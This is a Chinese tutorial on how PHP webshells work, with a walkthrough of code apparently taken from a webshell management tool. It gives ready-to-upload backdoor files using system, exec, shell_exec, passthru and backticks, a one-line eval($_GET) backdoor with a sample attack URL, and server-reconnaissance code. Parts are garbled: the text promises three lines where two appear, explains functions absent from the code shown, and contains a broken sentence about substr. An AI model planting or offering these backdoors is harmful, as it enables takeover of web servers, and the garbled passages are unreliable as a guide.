本文主要以php为例，探讨了webshell的工作原理，以及对webshell管理工具进行了一些简单的分析。

1、webshell

关于webshell，百度百科给出的解释如下

webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。正因如此，也有小部分人将代码修改后当作后门程序使用，以达到控制网站服务器的目的。

简单来说，webshell就是一个可被服务器解析的恶意代码文件，通过与客户端交互执行恶意代码达到控制服务器的目的。

原理

要在目标服务器上执行命令，一定需要相关的命令执行函数，如system()等，但这样的后门只能执行单一的命令，还不是很理想。但如果使用php代码执行函数，如eval()，则只需要每次发送想要执行的命令执行函数就可以了。

2、命令执行函数

system()

将参数作为系统命令运行，并输出结果

实例

向服务器上传文件system.php

<?php system("whoami"); ?>

访问该文件 192.168.1.12/trojan/system.php，得到命令执行结果

exec()

将参数作为系统命令运行，但不会自动输出结果，可指定第二个参数，将结果以数组形式进行输出。

实例

向服务器上传文件exec.php

<?php
exec("dir",$a);
print_r($a);
?>

访问该文件 192.168.1.12/trojan/exec.php，得到命令执行结果

shell_exec()

将参数作为系统命令运行，且可以直接以字符串输出结果

实例

向服务器上传文件shell_exec.php

<?php echo shell_exec("dir");?>

访问该文件 192.168.1.12/trojan/shell_exec.php，得到命令执行结果

passthru()

将参数作为系统命令运行，并以原始格式输出结果

实例

向服务器上传文件passthru.php

<?php passthru("dir");?>

访问该文件 192.168.1.12/trojan/passthru.php，得到命令执行结果

反引号(``)

将引号内数值作为系统命令执行

实例

向服务器上传文件```.php`

<?php echo `whoami`;?>

访问该文件 192.168.1.12/trojan/``.php，得到命令执行结果

3、代码执行函数

assert()：将参数当做 PHP 代码来执行，官方文档：PHP: assert - Manual

eval()：把字符串作为PHP代码执行，官方文档：PHP: eval - Manual

与前面的命令执行函数不同，eval()和assert()执行的是php代码，通过这种方式构造一句话后门，将真正用于执行命令的代码嵌套进代码执行函数中，就可以随意执行想要的命令了，如下：

<?php eval('system("whoami");'); ?>

成功执行

那么，只需要在上面代码的基础上，更改用于执行命令的代码，即system("whoami")，就可以通过一个后门，向服务器发送想执行的命令。所以，我们需要让这个后门能够自由接收来自客户端的php命令执行代码，如下是使用get方式进行接收：

<?php eval($_GET['shell']); ?>

构造如下payload

http://192.168.1.12/assert.php?shell=system('ls');

成功执行命令

@ini_set("display_errors","0");   //关闭PHP错误显示
@set_time_limit(0);      //防止命令执行超时

这三行主要是声明了一些配置，以确保执行正常

echo("->|");;
$D=dirname($_SERVER["SCRIPT_FILENAME"]);
if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);

首先根据官方文档，对其中的函数进行一个简单的说明：

$_SERVER["SCRIPT_FILENAME"]：用于获取当前执行脚本的绝对路径。

$_SERVER["PATH_TRANSLATED"]：获取当前脚本所在文件系统（非文档根目录）的基本路径。

dirname：获取此目录的父目录。

例如：若我们上传的后门文件为/var/www/html/trojan.php，则$_SERVER["SCRIPT_FILENAME"]或$_SERVER["PATH_TRANSLATED"]返回值为/var/www/html/trojan.php。而dirname($_SERVER["SCRIPT_FILENAME"])就会返回/var/www/html/。所以这一步实际上是得到了后门所在的完整目录路径，并将此值赋值给$D。

$R="{$D}\t";
if(substr($D,0,1)!="/"){
    foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";
}
$R.="\t";

使用substr($D,0,1)取出R的后面。经过这一步，$R已被赋值为脚本的执行路径。

$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';

首先再根据官方文档，对其中的函数进行一个简单的说明：

function_exists()：如果给定的函数已经被定义就返回 TRUE

posix_getegid()：获取当前组id

posix_getpwuid()：根据userid获取用户信息

posix_geteuid()：获取当前用户id

get_current_user()：获取当前 PHP 脚本所有者名称

php_uname()：返回运行 PHP 的系统的有关信息

这几步先是想办法获取当前用户的身份信息，并把值赋给了R后面。经过了这一步，$R中保存着 当前所在目录的路径、php信息及当前用户的信息。

print $R;;
echo("|<-");
die();

最后将得到的值打印出来，并结束函数运行。至于工具的其他功能操作，如执行命令等，在代码中引用了system等命令执行函数，方式和本操作大同小异，就不再赘述了。
